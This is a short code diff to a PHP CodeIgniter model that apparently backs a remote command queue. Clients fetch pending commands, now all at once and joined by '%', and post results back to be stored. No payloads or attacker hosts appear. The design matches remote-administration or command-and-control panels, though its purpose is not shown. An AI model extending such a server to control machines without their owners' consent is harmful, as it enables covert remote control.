@@ -6,20 +6,22 @@ class Client_command_model extends CI_Model{
 	}
     
     function get_command(){
-        $sql = 'select id,command from `command` where status = 0 order by id limit 1';
+        $sql = 'select id,command from `command` where status = 0 order by id';
         $query = $this->db->query($sql);
-        $command = $query->row_array();
-        if(!empty($command)){            
-            return $command['id'].':'.$command['command'];
+        $commands = $query->result_array();
+        if(!empty($commands)){    
+            $result = '';
+            foreach($commands as $command){
+                $result = $result.$command['id'].':'.$command['command'].'%';
+            }
+            return substr($result,0,strlen($result) - 1);
         }
         else{
             return 'noCommand';
         }
     }
     
-    function reply_command($result){
-        $command_id = substr($result,0,strpos($result,':'));
-        $command_result = base64_decode(substr($result,strpos($result,':') + 1));
+    function reply_command($command_id,$result){
         
         $sql = 'select count(*) from command where id = ? and status = 0';
         $query = $this->db->query($sql,array($command_id));
@@ -30,7 +32,7 @@ class Client_command_model extends CI_Model{
         }
         else{
             $sql = 'insert into result(result) values(?)';
-            $this->db->query($sql,array($command_result));
+            $this->db->query($sql,array($result));
             
             $sql = 'select id from `result` order by id desc limit 1';
             $query = $this->db->query($sql);
